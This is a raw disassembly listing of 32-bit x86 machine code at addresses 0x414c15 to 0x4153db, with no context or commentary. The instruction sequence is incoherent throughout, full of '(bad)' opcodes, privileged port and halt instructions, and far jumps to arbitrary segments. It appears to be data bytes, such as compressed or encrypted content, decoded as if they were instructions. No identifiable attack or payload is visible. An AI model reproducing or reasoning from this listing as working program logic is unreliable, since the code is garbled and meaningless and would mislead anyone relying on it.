  414c15:	xor    esp,DWORD PTR [esi+ebx*1-0x746acd97]
  414c1c:	adc    al,0x2e
  414c1e:	mov    dh,0x8d
  414c20:	fisttp WORD PTR [ebx+0x41751b8b]
  414c26:	stos   BYTE PTR es:[edi],al
  414c27:	pop    ecx
  414c28:	and    ebx,DWORD PTR [esi]
  414c2a:	mov    DWORD PTR ds:0x93409af6,0x4b4ad04c
  414c34:	test   BYTE PTR [esi+0x7b],bh
  414c37:	adc    DWORD PTR [ebp-0x1fe3cdaa],esi
  414c3d:	aas    
  414c3e:	jb     0x414c4b
  414c40:	adc    dl,bl
  414c42:	push   ebp
  414c43:	sbb    bh,ah
  414c45:	jg     0x414c46
  414c47:	or     al,ch
  414c49:	repnz pop esi
  414c4b:	hlt    
  414c4c:	cdq    
  414c4d:	xchg   ebx,eax
  414c4e:	mov    dl,0xec
  414c50:	lods   eax,DWORD PTR ds:[esi]
  414c51:	sbb    DWORD PTR [edx+0x2bafab7f],0xffffffd0
  414c58:	enter  0x85df,0x72
  414c5c:	cmp    al,0x90
  414c5e:	mov    bl,0x26
  414c60:	sar    BYTE PTR [ecx],1
  414c62:	sub    dh,BYTE PTR [edx+0x76]
  414c65:	iret   
  414c66:	adc    edi,DWORD PTR [ebp-0x3a7f224]
  414c6c:	shl    BYTE PTR [ecx+0x6810c8ae],cl
  414c72:	adc    DWORD PTR [edx-0x47e79ef9],esi
  414c78:	into   
  414c79:	js     0x414c6f
  414c7b:	lea    esi,[eax+0x36c7c96d]
  414c81:	mov    esp,0xc0a55a89
  414c86:	ds retf 
  414c88:	ss push edx
  414c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c8b:	aaa    
  414c8c:	(bad)  
  414c8d:	adc    DWORD PTR [ebx+0x43],esp
  414c90:	sub    esp,DWORD PTR ds:0x6cb7488c
  414c96:	mov    dh,0x9
  414c98:	push   ds
  414c99:	xchg   edx,eax
  414c9a:	cdq    
  414c9b:	add    bh,bl
  414c9d:	mov    cs,eax
  414c9f:	mov    al,0x1f
  414ca1:	out    0x29,al
  414ca3:	mov    ebx,0xcd57d921
  414ca8:	cmp    eax,DWORD PTR [edi]
  414caa:	rol    ebp,cl
  414cac:	test   eax,0xa1e8b021
  414cb1:	cmp    DWORD PTR [edi+eax*8-0x21],ebx
  414cb5:	fs mov edi,0xe8939be1
  414cbb:	rcr    cl,cl
  414cbd:	xlat   BYTE PTR ds:[ebx]
  414cbe:	scas   eax,DWORD PTR es:[edi]
  414cbf:	mov    dl,cl
  414cc1:	inc    edx
  414cc2:	(bad)  
  414cc3:	out    dx,al
  414cc4:	dec    ebp
  414cc5:	xchg   edi,eax
  414cc6:	shl    BYTE PTR [ebx-0x3c],1
  414cc9:	pop    edx
  414cca:	mov    eax,0xeb78ab56
  414ccf:	stos   BYTE PTR es:[edi],al
  414cd0:	push   0xffffffc0
  414cd2:	clc    
  414cd3:	sub    al,0x19
  414cd5:	pop    ds
  414cd6:	xchg   ebp,eax
  414cd7:	fimul  DWORD PTR [ebp-0x17019432]
  414cdd:	imul   ebp,DWORD PTR [esi+0x7c1e7a0a],0x64
  414ce4:	aas    
  414ce5:	pusha  
  414ce6:	mov    al,ds:0x289871ce
  414ceb:	jle    0x414cab
  414ced:	xchg   DWORD PTR [ecx-0x13d46da1],esi
  414cf3:	or     BYTE PTR [esi+0x326bd772],cl
  414cf9:	xchg   esp,eax
  414cfa:	jle    0x414ccc
  414cfc:	fs cs jge 0x414cf1
  414d00:	ficomp DWORD PTR [ecx-0x5edc44d4]
  414d06:	sar    al,cl
  414d08:	jg     0x414d82
  414d0a:	test   DWORD PTR [ecx+0x3d],edi
  414d0d:	xor    al,0xfd
  414d0f:	adc    eax,0x7fd9fcbd
  414d14:	push   ebx
  414d15:	mov    ch,0xc4
  414d17:	in     al,dx
  414d18:	xchg   esp,eax
  414d19:	stos   BYTE PTR es:[edi],al
  414d1a:	int3   
  414d1b:	fidiv  WORD PTR [eax+0x68]
  414d1e:	ror    DWORD PTR [ebp+0x14],0xb5
  414d22:	jns    0x414d3c
  414d24:	inc    esi
  414d25:	imul   edx,DWORD PTR [edi-0x46e88982],0x97a2824f
  414d2f:	clc    
  414d30:	jecxz  0x414ce0
  414d32:	push   esi
  414d33:	xchg   ebx,eax
  414d34:	rol    ch,1
  414d36:	pushf  
  414d37:	or     ebp,edi
  414d39:	hlt    
  414d3a:	(bad)  
  414d3b:	cbw    
  414d3d:	out    0xbe,eax
  414d3f:	retf   0x28aa
  414d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d43:	pop    es
  414d44:	mov    bh,0xf0
  414d46:	jbe    0x414d74
  414d48:	mov    dl,0x12
  414d4a:	dec    edx
  414d4b:	mov    BYTE PTR cs:[esi+0x2e476ec2],bh
  414d52:	push   0xffffffa6
  414d54:	and    eax,DWORD PTR [edx+0x380860f8]
  414d5a:	pushf  
  414d5b:	sub    eax,DWORD PTR [ebp-0x67]
  414d5e:	dec    ecx
  414d5f:	xchg   edi,eax
  414d60:	inc    eax
  414d61:	and    al,0x2d
  414d63:	inc    ebp
  414d64:	jno    0x414d0d
  414d66:	mov    bl,0x44
  414d68:	shr    DWORD PTR [ecx-0x723b7c21],0x7a
  414d6f:	rol    BYTE PTR fs:[ecx-0x12],0xe7
  414d74:	jecxz  0x414d32
  414d76:	out    dx,al
  414d77:	or     bl,BYTE PTR [esi-0x5c]
  414d7a:	sub    DWORD PTR [ebx],esi
  414d7c:	nop
  414d7d:	retf   
  414d7e:	aaa    
  414d7f:	add    edi,ecx
  414d81:	repz and DWORD PTR [edi],esi
  414d84:	in     eax,0x86
  414d86:	pop    edx
  414d87:	lea    ecx,[esi-0x1ee9bb59]
  414d8d:	lods   al,BYTE PTR ds:[esi]
  414d8e:	inc    edx
  414d8f:	and    eax,0xa02306cb
  414d94:	mul    esi
  414d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d97:	mov    ecx,0x3de707a8
  414d9c:	ds add dl,ch
  414d9f:	jecxz  0x414d81
  414da1:	jns    0x414d2c
  414da3:	ja     0x414d90
  414da5:	inc    edx
  414da6:	pop    ebx
  414da7:	inc    esp
  414da8:	cmc    
  414da9:	aaa    
  414daa:	mov    al,0x61
  414dac:	clc    
  414dad:	nop
  414dae:	repnz (bad) 
  414db0:	(bad)  
  414db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414db2:	(bad)  
  414db3:	int    0x3d
  414db5:	(bad)  
  414db7:	pcmpgtb mm6,QWORD PTR [eax]
  414dba:	int3   
  414dbb:	add    edi,DWORD PTR [esi]
  414dbd:	pushf  
  414dbe:	aam    0x31
  414dc0:	ins    DWORD PTR es:[edi],dx
  414dc1:	inc    esi
  414dc2:	pop    esi
  414dc3:	in     al,0x9d
  414dc5:	pop    ss
  414dc6:	(bad)  
  414dc7:	std    
  414dc8:	out    0xf,al
  414dca:	push   0xdfca2f3b
  414dcf:	test   BYTE PTR [ebx],0x11
  414dd2:	sub    dh,BYTE PTR [eax-0x88d992e]
  414dd8:	xabort 0xca
  414ddb:	jg     0x414d86
  414ddd:	push   ds
  414dde:	push   ds
  414ddf:	mov    ds:0x9059c476,eax
  414de4:	sbb    ebx,DWORD PTR [ebx]
  414de6:	(bad)  
  414de7:	leave  
  414de8:	inc    eax
  414de9:	fcom   QWORD PTR [edi+0x6b509cf]
  414def:	call   0x971a:0x3ec1c268
  414df6:	jmp    0x414df6
  414df8:	adc    bh,BYTE PTR [ebx]
  414dfa:	int    0xba
  414dfc:	xchg   DWORD PTR [esi-0x3bba48c],ebp
  414e02:	xor    ebx,DWORD PTR [eax-0x40be90d8]
  414e08:	inc    edi
  414e09:	lock jge 0x414dd7
  414e0c:	push   ecx
  414e0d:	jecxz  0x414dfa
  414e0f:	and    dl,BYTE PTR ds:0xf3a107d5
  414e15:	sbb    BYTE PTR [eax+ebp*2+0x48099008],al
  414e1c:	or     eax,0xaf06b817
  414e21:	add    al,0x79
  414e23:	inc    esi
  414e24:	pushf  
  414e25:	cmp    eax,0x370ab0ff
  414e2a:	fdivr  st(3),st
  414e2c:	jg     0x414dc0
  414e2e:	pop    eax
  414e2f:	inc    edi
  414e30:	loop   0x414e01
  414e32:	(bad)  
  414e33:	scas   eax,DWORD PTR es:[edi]
  414e34:	ret    
  414e35:	sub    eax,0xf467becb
  414e3a:	push   cs
  414e3b:	(bad)  
  414e3d:	imul   edi,DWORD PTR [edi-0x5b],0x6b
  414e41:	mov    esi,fs
  414e43:	shl    BYTE PTR [esi],0x0
  414e46:	loop   0x414e12
  414e48:	sub    BYTE PTR [ebx],dh
  414e4a:	shr    DWORD PTR [eax],0x67
  414e4d:	out    0xa0,al
  414e4f:	int3   
  414e50:	jae    0x414e61
  414e52:	push   0xb85381e7
  414e57:	sbb    ebx,DWORD PTR [esi]
  414e59:	mov    DWORD PTR [ebx-0xe],0x67f5bc5c
  414e60:	ret    
  414e61:	mov    DWORD PTR [esi],0xe75ca34
  414e67:	sub    DWORD PTR [esi+0x31],0xffffff92
  414e6b:	leave  
  414e6c:	jne    0x414ee2
  414e6e:	xor    bh,dl
  414e70:	push   es
  414e71:	push   edi
  414e72:	push   edi
  414e73:	pop    edx
  414e74:	add    ecx,ebx
  414e76:	dec    esi
  414e77:	dec    ebx
  414e78:	adc    ebp,edi
  414e7a:	ret    0xa200
  414e7d:	jb     0x414e1c
  414e7f:	into   
  414e80:	xchg   ecx,eax
  414e81:	mov    al,BYTE PTR [esi-0xf]
  414e84:	xchg   DWORD PTR [eax+0x55f96b37],esp
  414e8a:	jg     0x414e5d
  414e8c:	push   ebx
  414e8d:	sub    edx,esp
  414e8f:	jp     0x414eec
  414e91:	daa    
  414e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e93:	das    
  414e94:	mov    BYTE PTR [ecx-0x58cec31a],bh
  414e9a:	xor    ecx,DWORD PTR [edx-0x6d]
  414e9d:	jbe    0x414eb7
  414e9f:	std    
  414ea0:	outs   dx,BYTE PTR ds:[esi]
  414ea1:	mov    ecx,0x53b6786f
  414ea6:	push   esp
  414ea7:	(bad)
  414eaa:	pop    esp
  414eab:	mov    DWORD PTR [edi+0x627c6471],ebx
  414eb1:	mov    ds:0xa9ce08cb,al
  414eb6:	or     al,0x24
  414eb8:	xchg   ebp,eax
  414eb9:	nop
  414eba:	xchg   ebx,eax
  414ebb:	xor    DWORD PTR [eax+0x51],0xffffffea
  414ebf:	dec    ecx
  414ec0:	cli    
  414ec1:	jbe    0x414e47
  414ec3:	add    BYTE PTR [edx],ah
  414ec5:	shl    DWORD PTR [esi-0x72548238],cl
  414ecb:	scas   al,BYTE PTR es:[edi]
  414ecc:	add    eax,0xf42847bb
  414ed1:	stc    
  414ed2:	xchg   ebp,eax
  414ed3:	inc    ebx
  414ed4:	dec    edi
  414ed5:	inc    ebx
  414ed6:	inc    ebx
  414ed7:	repnz loope 0x414e7a
  414eda:	cdq    
  414edb:	aaa    
  414edc:	pop    edx
  414edd:	push   ds
  414ede:	xlat   BYTE PTR ds:[ebx]
  414edf:	cwde   
  414ee0:	jg     0x414f50
  414ee2:	out    dx,al
  414ee3:	mov    cl,BYTE PTR [edi+0x47502189]
  414ee9:	cmp    DWORD PTR [edx-0x1e],eax
  414eec:	fild   QWORD PTR [esi]
  414eee:	test   eax,0x9b28f8e3
  414ef3:	out    dx,al
  414ef4:	xchg   edx,eax
  414ef5:	pinsrw mm2,ecx,0x6c
  414ef9:	add    dh,dl
  414efb:	jno    0x414eb0
  414efd:	scas   al,BYTE PTR es:[edi]
  414efe:	test   DWORD PTR [eax+esi*4],0xb585f153
  414f05:	repz jecxz 0x414ecf
  414f08:	cli    
  414f09:	push   edi
  414f0a:	xchg   BYTE PTR [edx+0x26d6ecbe],ah
  414f10:	xor    ebx,DWORD PTR ds:[ebp-0x30]
  414f14:	enter  0x377f,0xf0
  414f18:	(bad)  
  414f19:	(bad)  
  414f1a:	imul   edi,esp,0xffffff94
  414f1d:	fistp  DWORD PTR [ebp+0x42dd0eaf]
  414f23:	jbe    0x414f1f
  414f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f26:	retf   
  414f27:	xchg   esi,eax
  414f28:	add    eax,0x6e7c0c03
  414f2d:	fcompp 
  414f2f:	jns    0x414f77
  414f31:	cld    
  414f32:	sub    BYTE PTR [ecx+edi*8+0x438367f0],ah
  414f39:	or     edx,DWORD PTR [edx+0x1b289c5c]
  414f3f:	ss mov dl,0xc3
  414f42:	ins    BYTE PTR es:[edi],dx
  414f43:	daa    
  414f44:	mov    ah,0x38
  414f46:	mov    edx,0x1c1867bb
  414f4b:	sub    al,0x69
  414f4d:	inc    esp
  414f4e:	adc    BYTE PTR [eax],bl
  414f50:	jge    0x414ee1
  414f52:	push   ebp
  414f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f54:	dec    esp
  414f55:	mov    ebx,0x873896d7
  414f5a:	sub    eax,ebx
  414f5c:	repnz mov ebp,ebx
  414f5f:	rcl    BYTE PTR [esp+edx*2-0x5444255d],cl
  414f66:	push   esp
  414f67:	pop    ebp
  414f68:	retf   0xf262
  414f6b:	cmc    
  414f6c:	fld    DWORD PTR [esi]
  414f6e:	dec    ecx
  414f6f:	(bad)  
  414f70:	push   DWORD PTR [edx+edx*8+0x4d468d17]
  414f77:	fld    QWORD PTR [edi]
  414f79:	cs push cs
  414f7b:	shl    bh,1
  414f7d:	inc    esi
  414f7e:	out    0x9d,al
  414f80:	dec    ebp
  414f81:	ins    DWORD PTR es:[edi],dx
  414f82:	add    BYTE PTR [esi+edx*2],dh
  414f85:	cwde   
  414f86:	shl    BYTE PTR [ecx],cl
  414f88:	data16 or al,0x80
  414f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f8c:	pop    edx
  414f8d:	pop    ecx
  414f8e:	pop    esi
  414f8f:	fucomp st(1)
  414f91:	fisttp QWORD PTR [ecx-0x20ccc3e9]
  414f97:	xor    DWORD PTR [eax+0x7b],0x845e902e
  414f9e:	lea    ebx,[edx-0x5d4acae3]
  414fa4:	mov    bh,0x58
  414fa6:	jp     0x414f2f
  414fa8:	mov    WORD PTR [ebx+0x47],cs
  414fab:	and    bh,BYTE PTR [edi]
  414fad:	dec    eax
  414fae:	xchg   ebp,eax
  414faf:	xchg   ecx,eax
  414fb0:	dec    esp
  414fb1:	jmp    0x2dc7686c
  414fb6:	push   0x50b5cea2
  414fbb:	daa    
  414fbc:	xor    al,0xb3
  414fbe:	adc    eax,0xe2dbfc9b
  414fc3:	pop    ecx
  414fc4:	xor    eax,DWORD PTR [ecx+0x1e2e0785]
  414fca:	data16 cmp bh,BYTE PTR [eax]
  414fcd:	shr    DWORD PTR [esi],cl
  414fcf:	xor    esp,ebp
  414fd1:	inc    ecx
  414fd2:	sbb    al,0x55
  414fd4:	sbb    BYTE PTR [edx-0x2045534c],al
  414fda:	jmp    0xbd90e2a
  414fdf:	jns    0x415059
  414fe1:	aam    0x72
  414fe3:	push   edi
  414fe4:	pop    ecx
  414fe5:	inc    ebx
  414fe6:	push   es
  414fe7:	xor    BYTE PTR [esi+esi*4],dl
  414fea:	(bad)
  414fed:	mov    al,0xb4
  414fef:	stos   BYTE PTR es:[edi],al
  414ff0:	dec    edi
  414ff1:	imul   ebx,DWORD PTR [ecx+0x4a],0x57
  414ff5:	dec    eax
  414ff6:	jecxz  0x414f9d
  414ff8:	int    0x3b
  414ffa:	or     eax,0x3d73f8c7
  414fff:	hlt    
  415000:	scas   eax,DWORD PTR es:[edi]
  415001:	inc    ebp
  415002:	lahf   
  415003:	pop    ecx
  415004:	rcr    edi,0x97
  415007:	shr    BYTE PTR [edi-0x45d77fe8],0xf5
  41500e:	gs retf 
  415010:	aad    0x1c
  415012:	jge    0x41506e
  415014:	jno    0x415045
  415016:	mov    ds:0xac0cdf00,al
  41501b:	stos   DWORD PTR es:[edi],eax
  41501c:	retf   0x8ccd
  41501f:	idiv   eax
  415021:	and    edx,ebp
  415023:	addr16 jb 0x41507b
  415026:	cmp    al,bh
  415028:	push   ss
  415029:	sbb    DWORD PTR [edi+0x2],esi
  41502c:	ss dec edi
  41502e:	imul   esi,DWORD PTR es:0xf3ff1b32,0xffffffff
  415036:	out    0xe,eax
  415038:	push   ecx
  415039:	inc    edx
  41503a:	mov    ebp,DWORD PTR [ebx+0x18af09de]
  415040:	cmc    
  415041:	sub    BYTE PTR [edi+0xef83100],cl
  415047:	mov    ds:0x4f32a52,al
  41504c:	inc    ecx
  41504d:	retf   
  41504e:	inc    esi
  41504f:	mov    ah,BYTE PTR [esi]
  415051:	clc    
  415052:	mov    esp,0x8b6ea0dd
  415057:	aad    0x6f
  415059:	les    esi,FWORD PTR [eax-0x1ef1b113]
  41505f:	xor    al,0xe9
  415061:	(bad)  
  415062:	jne    0x4150de
  415064:	or     al,0xa1
  415066:	mov    bl,0x91
  415068:	xchg   esi,eax
  415069:	or     DWORD PTR [ebp+0x7e],eax
  41506c:	(bad)  
  41506d:	and    ch,BYTE PTR [ecx-0x52]
  415070:	and    edi,ebx
  415072:	adc    eax,0x2757cf30
  415077:	mov    edx,ecx
  415079:	inc    BYTE PTR [edi+0x56]
  41507c:	xchg   al,bh
  41507e:	aam    0x10
  415080:	dec    esi
  415081:	fdivr  st,st(7)
  415083:	leave  
  415084:	push   es
  415085:	or     eax,0xd67ad
  41508a:	data16 or BYTE PTR [ecx-0x35],bh
  41508e:	out    dx,al
  41508f:	shl    BYTE PTR [esi+0xf5d9d97],0x43
  415096:	stos   BYTE PTR es:[edi],al
  415097:	inc    ecx
  415098:	adc    edx,DWORD PTR [ebx]
  41509a:	push   edi
  41509b:	pushf  
  41509c:	mov    al,ds:0x93293fc8
  4150a1:	out    0xee,eax
  4150a3:	pop    ds
  4150a4:	xchg   bp,ax
  4150a6:	xor    dh,BYTE PTR [ebx-0x37684cdf]
  4150ac:	mov    ebx,0xe23bf678
  4150b1:	repz inc ecx
  4150b3:	addr16 jp 0x41503f
  4150b6:	xchg   esi,eax
  4150b7:	test   BYTE PTR [edi-0xd],al
  4150ba:	rcl    DWORD PTR [ecx],cl
  4150bc:	mov    DWORD PTR [edx+0x6cda7b91],ecx
  4150c2:	shl    DWORD PTR [ecx+edx*1],0x79
  4150c6:	enter  0xb2a2,0xe8
  4150ca:	adc    esp,esi
  4150cc:	sub    BYTE PTR [edx-0x3c],bh
  4150cf:	mul    BYTE PTR [edx+0x4a]
  4150d2:	inc    edx
  4150d3:	nop    ebx
  4150d6:	ficom  WORD PTR [edx+0x3]
  4150d9:	jbe    0x415138
  4150db:	add    eax,0xd0318b07
  4150e0:	sbb    al,0xcc
  4150e2:	not    al
  4150e4:	jmp    0x5b2a:0x9c127011
  4150eb:	sbb    ebp,edx
  4150ed:	inc    edx
  4150ee:	push   es
  4150ef:	call   0x5c552c3d
  4150f4:	inc    esp
  4150f5:	fisttp DWORD PTR [edi-0x2f]
  4150f8:	fwait
  4150f9:	sbb    DWORD PTR [eax+0x13],0xffffffd2
  4150fd:	test   DWORD PTR [esi],ebp
  4150ff:	inc    ch
  415101:	add    eax,0xf3b4fe29
  415106:	shl    DWORD PTR [edi],cl
  415108:	ins    BYTE PTR es:[edi],dx
  415109:	and    al,0x1f
  41510b:	ins    DWORD PTR es:[edi],dx
  41510c:	jae    0x4150a4
  41510e:	mov    ds:0xa1d2ef6c,eax
  415113:	mov    ebp,0xe127298
  415118:	repz repnz adc ebp,ecx
  41511c:	arpl   WORD PTR [eax+ecx*8+0x3f4481f1],ax
  415123:	sbb    BYTE PTR [edx+0x4a],dh
  415126:	in     eax,dx
  415127:	push   0x45
  415129:	pop    ss
  41512a:	pop    edi
  41512b:	xor    cl,BYTE PTR [ebp-0x40]
  41512e:	mov    ebx,0x9b6381f8
  415133:	jo     0x415129
  415135:	test   DWORD PTR [edx+0x64e94077],0x9b1e82c1
  41513f:	stc    
  415140:	(bad)  
  415141:	addr16 sbb edi,0x3b9244e7
  415148:	stc    
  415149:	call   0xd8ad:0x3d38662f
  415150:	add    dl,bh
  415152:	shl    DWORD PTR [edi+ebp*8+0x46],1
  415156:	ds stos BYTE PTR es:[edi],al
  415158:	jp     0x415142
  41515a:	and    ch,bl
  41515c:	call   0x9de9:0xa73c035f
  415163:	push   ss
  415164:	ins    DWORD PTR es:[edi],dx
  415165:	jae    0x415111
  415167:	je     0x415188
  415169:	mov    al,0x15
  41516b:	pop    ebp
  41516c:	add    DWORD PTR [esi+0x72],esi
  41516f:	pop    ds
  415170:	adc    eax,0x7bbcf15b
  415175:	inc    eax
  415176:	xor    esp,DWORD PTR ds:0x6e7d3682
  41517c:	xlat   BYTE PTR ds:[ebx]
  41517d:	std    
  41517e:	mov    cs,ecx
  415180:	push   eax
  415181:	ret    0xeec1
  415184:	lock retf 0xbb8e
  415188:	rcl    DWORD PTR [edi],1
  41518a:	push   0xa0dbc1aa
  41518f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415190:	iret   
  415191:	jbe    0x4151f2
  415193:	sub    BYTE PTR [eax],0x66
  415196:	jle    0x4151a2
  415198:	mov    ecx,0x4ea0c74e
  41519d:	dec    edi
  41519e:	fs adc eax,0x77b728f9
  4151a4:	adc    DWORD PTR [ecx],0x78
  4151a7:	ror    BYTE PTR [edi-0x48],cl
  4151aa:	mov    edi,0x99a21bc2
  4151af:	mov    BYTE PTR ds:0x4be0ad11,al
  4151b5:	stc    
  4151b6:	xor    DWORD PTR [ebp-0x6c7a35be],ebp
  4151bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151bd:	xor    eax,DWORD PTR [edi]
  4151bf:	jle    0x415201
  4151c1:	icebp  
  4151c2:	push   ss
  4151c3:	push   edi
  4151c4:	jb     0x41516b
  4151c6:	mov    edx,0x41c7460e
  4151cb:	adc    al,0xc8
  4151cd:	mov    ebp,0xe3abb050
  4151d2:	lea    esi,[ecx-0x5f]
  4151d5:	or     al,0x8d
  4151d7:	and    dl,bh
  4151d9:	jl     0x4151af
  4151db:	sub    eax,0xdac967f3
  4151e0:	test   DWORD PTR ss:[eax+0x56],edi
  4151e4:	into   
  4151e5:	push   DWORD PTR [eax+0x24]
  4151e8:	push   edx
  4151e9:	xor    BYTE PTR [edx-0x2a46f53c],0x70
  4151f0:	ror    BYTE PTR [ebp+0x26],cl
  4151f3:	dec    esp
  4151f4:	test   DWORD PTR [ebp+eax*8-0x630220bc],esi
  4151fb:	cmp    DWORD PTR [esi+ebx*8-0x27],edi
  4151ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415200:	ins    BYTE PTR es:[edi],dx
  415201:	jo     0x4151bd
  415203:	inc    dx
  415205:	loop   0x4151e2
  415207:	push   esi
  415208:	sub    DWORD PTR [edx],esp
  41520a:	or     edi,ecx
  41520c:	cwde   
  41520d:	sbb    BYTE PTR [ebp+0x17535807],dh
  415213:	ins    DWORD PTR es:[edi],dx
  415214:	jmp    0x160b:0x335ed6cf
  41521b:	push   edx
  41521c:	sub    ebp,DWORD PTR [ebx+0x499fe110]
  415222:	lods   al,BYTE PTR ds:[esi]
  415223:	fnstcw WORD PTR [edi+ebp*2-0xc]
  415227:	outs   dx,DWORD PTR ds:[esi]
  415228:	adc    DWORD PTR [ebp+0x480ad584],0x7d
  41522f:	and    ecx,DWORD PTR [edi-0x55]
  415232:	out    0x62,al
  415234:	ss xchg esi,eax
  415236:	pop    ecx
  415237:	push   ss
  415238:	test   al,0x69
  41523a:	and    al,0xbf
  41523c:	mov    al,ds:0x779eb9f9
  415241:	(bad)  
  415242:	xor    esi,DWORD PTR [eax-0x3eb2e9c]
  415248:	add    eax,0x968c016a
  41524d:	jecxz  0x415218
  41524f:	(bad)  
  415250:	and    eax,0x1c0ed067
  415255:	jne    0x415280
  415257:	jmp    0xa6b:0xf5e21465
  41525e:	out    0x64,al
  415260:	cld    
  415261:	(bad)  
  415262:	adc    eax,0xe902ede3
  415267:	ror    cl,1
  415269:	(bad)  
  41526a:	push   cs
  41526b:	jge    0x415248
  41526d:	or     bh,BYTE PTR [ebx]
  41526f:	jae    0x4151f3
  415271:	mov    edx,0xdc3cf461
  415276:	cmp    al,0xeb
  415278:	push   0x89ddaac3
  41527d:	lea    eax,[ecx]
  41527f:	xchg   edx,eax
  415280:	ins    DWORD PTR es:[edi],dx
  415281:	leave  
  415282:	int    0xc9
  415284:	aas    
  415285:	(bad)  
  415286:	ja     0x4152e7
  415288:	fwait
  415289:	pop    ebp
  41528a:	sub    esp,ebp
  41528c:	cmp    BYTE PTR [esi+0x6f2c7fe5],0x6a
  415293:	lods   al,BYTE PTR ds:[esi]
  415294:	dec    ebx
  415295:	hlt    
  415296:	fwait
  415297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415298:	sbb    edx,DWORD PTR [edx+0x1a185efb]
  41529e:	sbb    al,0x7e
  4152a0:	out    0xef,eax
  4152a2:	daa    
  4152a3:	lahf   
  4152a4:	mov    ch,dh
  4152a6:	adc    BYTE PTR [edx+0x18dcefd4],dh
  4152ac:	mov    es,ecx
  4152ae:	jmp    0x41523c
  4152b0:	add    DWORD PTR ds:0xe8c57f51,ecx
  4152b6:	xchg   ebp,eax
  4152b7:	fwait
  4152b8:	bound  esp,QWORD PTR [ecx-0xec92290]
  4152be:	js     0x41530b
  4152c0:	test   eax,0xa3404ecb
  4152c5:	jno    0x4152b2
  4152c7:	xor    BYTE PTR [esi],dl
  4152c9:	aaa    
  4152ca:	dec    edx
  4152cb:	jg     0x4152b0
  4152cd:	lahf   
  4152ce:	inc    ebp
  4152cf:	fndisi(8087 only) 
  4152d1:	mov    ch,0xac
  4152d3:	imul   esp,DWORD PTR [ebx+0x5215390b],0x36
  4152da:	mov    DWORD PTR [eax],esp
  4152dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152dd:	mov    bl,0xae
  4152df:	ss test al,0x1e
  4152e2:	or     ah,BYTE PTR [esp+ebp*1+0x19]
  4152e6:	jmp    0x5459:0xbf8a2979
  4152ed:	add    edx,DWORD PTR [ebx+0x5d17957e]
  4152f3:	mov    al,ds:0x4bed0b60
  4152f8:	sahf   
  4152f9:	push   cs
  4152fa:	out    dx,al
  4152fb:	xor    BYTE PTR [edx],bh
  4152fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152fe:	mov    al,0x1d
  415300:	push   edi
  415301:	adc    ch,BYTE PTR [edx-0x13f918b8]
  415307:	test   BYTE PTR [edi-0x20fddab5],al
  41530d:	adc    ecx,ebx
  41530f:	jb     0x4152b0
  415311:	cmp    ebx,DWORD PTR [esi]
  415313:	retf   
  415314:	aam    0xd4
  415316:	xor    esi,esp
  415318:	enter  0xf5a6,0x34
  41531c:	scas   eax,DWORD PTR es:[edi]
  41531d:	loopne 0x4152cb
  41531f:	or     ah,BYTE PTR [eax]
  415321:	jle    0x415349
  415323:	and    esi,DWORD PTR [esp+eax*2]
  415326:	jp     0x41533c
  415328:	aam    0x77
  41532a:	test   edx,eax
  41532c:	pushf  
  41532d:	lahf   
  41532e:	stos   BYTE PTR es:[edi],al
  41532f:	shl    BYTE PTR [ebx+edi*4+0x636188a0],cl
  415336:	fistp  DWORD PTR [esi]
  415338:	mov    ch,0xc
  41533a:	jp     0x4152fd
  41533c:	inc    edx
  41533d:	leave  
  41533e:	imul   esi,ebx,0xb
  415341:	dec    ebx
  415342:	fisttp DWORD PTR [ebx-0x6a]
  415345:	fbld   TBYTE PTR [ebx]
  415347:	mov    al,0xbe
  415349:	mov    al,ds:0x24deedc7
  41534e:	gs fmul st,st(4)
  415351:	mov    dh,0x25
  415353:	mov    ch,0x3e
  415355:	dec    ebx
  415356:	jmp    0xf1651215
  41535b:	sbb    ebx,DWORD PTR [ecx+0x37262f90]
  415361:	jge    0x415308
  415363:	test   DWORD PTR [eax-0x505506c],edi
  415369:	sub    BYTE PTR [ebx-0x1b],bh
  41536c:	adc    al,0x7d
  41536e:	pop    edi
  41536f:	xor    dl,BYTE PTR [ebx-0x69d649e2]
  415375:	mov    edi,0x30b111db
  41537a:	lea    esi,[eax+edi*8+0x25]
  41537e:	lods   eax,DWORD PTR ds:[esi]
  41537f:	xor    al,0xeb
  415381:	mov    ebp,0x98950fbd
  415386:	mov    WORD PTR fs:[edi],fs
  415389:	(bad)  
  41538a:	sbb    BYTE PTR [eax+0x6a],cl
  41538d:	xchg   esp,eax
  41538e:	shl    BYTE PTR [edx+ebp*4+0x7],cl
  415392:	dec    ebx
  415393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415394:	sbb    al,0x6d
  415396:	mov    dl,0xce
  415398:	inc    edx
  415399:	in     al,dx
  41539a:	ret    
  41539b:	aam    0x5c
  41539d:	sbb    DWORD PTR [edi+0x4d35b04f],esi
  4153a3:	sub    al,BYTE PTR [edx]
  4153a5:	test   al,0x70
  4153a7:	stos   BYTE PTR es:[edi],al
  4153a8:	add    BYTE PTR [ebp-0x3581eee2],bh
  4153ae:	or     eax,0x8feb34a0
  4153b3:	shl    DWORD PTR [ecx+0x5fe4befd],1
  4153b9:	mov    ebp,DWORD PTR [edi+eiz*2+0x28]
  4153bd:	push   ss
  4153be:	and    BYTE PTR [ebp-0x28],ch
  4153c1:	inc    edi
  4153c2:	call   0x8498f5d8
  4153c7:	xchg   BYTE PTR [edx+0x70878e98],al
  4153cd:	sbb    eax,DWORD PTR [ecx]
  4153cf:	cdq    
  4153d0:	inc    edi
  4153d1:	mov    ah,0x84
  4153d3:	and    DWORD PTR [ebp-0x792a9fec],esp
  4153d9:	xchg   ecx,eax
  4153da:	stc    
  4153db:	jecxz  0x415425
